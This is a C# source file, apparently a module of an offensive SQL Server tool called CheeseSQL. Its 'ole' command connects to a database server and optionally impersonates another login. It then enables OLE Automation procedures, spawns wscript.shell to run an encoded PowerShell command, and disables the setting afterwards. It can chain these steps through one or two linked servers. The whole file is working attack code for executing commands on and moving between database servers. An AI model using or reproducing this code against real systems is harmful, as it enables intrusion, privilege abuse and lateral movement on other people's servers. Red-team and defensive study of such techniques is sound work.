using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace CheeseSQL.Commands
{
    public class ole : ICommand
    {
        public static string CommandName => "ole";

        public string Description()
        {
            return $"[*] {CommandName}\r\n" +
                   $"  Description: Execute Encoded PowerShell Command via 'sp_OACreate' and 'sp_OAMethod'";
        }

        public string Usage()
        {
            return $"{Description()}\r\n  " +
                $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} " +
                $"/db:DATABASE " +
                $"/server:SERVER " +
                $"/command:COMMAND " +
                $"[/impersonate:USER] " +
                $"[/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
        }

        public void Execute(Dictionary<string, string> arguments)
        {

            string connectInfo = "";
            string database = "";
            string connectserver = "";
            string intermediate = "";
            string target = "";
            string impersonate = "";
            string impersonate_intermediate = "";
            string impersonate_linked = "";
            string cmd = "";

            bool sqlauth = arguments.ContainsKey("/sqlauth");

            arguments.TryGetValue("/impersonate", out impersonate);
            arguments.TryGetValue("/intermediate", out intermediate);
            arguments.TryGetValue("/target", out target);
            arguments.TryGetValue("/impersonate-intermediate", out impersonate_intermediate);
            arguments.TryGetValue("/impersonate-linked", out impersonate_linked);

            if (!arguments.TryGetValue("/db", out database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/server", out connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (!arguments.TryGetValue("/command", out cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, connectserver, database, sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            var procedures = new Dictionary<string, string>();

            if (!String.IsNullOrEmpty(impersonate))
            {
                procedures.Add($"Attempting impersonation as {impersonate}..", $"EXECUTE AS LOGIN = '{impersonate}';");
            }

            procedures.Add("Enabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;");
            procedures.Add("Executing command..", $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc {cmd}';");
            procedures.Add("Disabling OLE Automation Procedures..", $"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);

                if (String.IsNullOrEmpty(target) && String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteProcedure(connection, procedures[step]);
                }
                else if (String.IsNullOrEmpty(intermediate))
                {
                    SQLExecutor.ExecuteLinkedProcedure(connection, procedures[step], target, impersonate, impersonate_linked);
                }
                else
                {
                    SQLExecutor.ExecuteDoubleLinkedProcedure(connection, procedures[step], target, intermediate, impersonate, impersonate_linked, impersonate_intermediate);
                }
            }

            connection.Close();
        }
    }
}
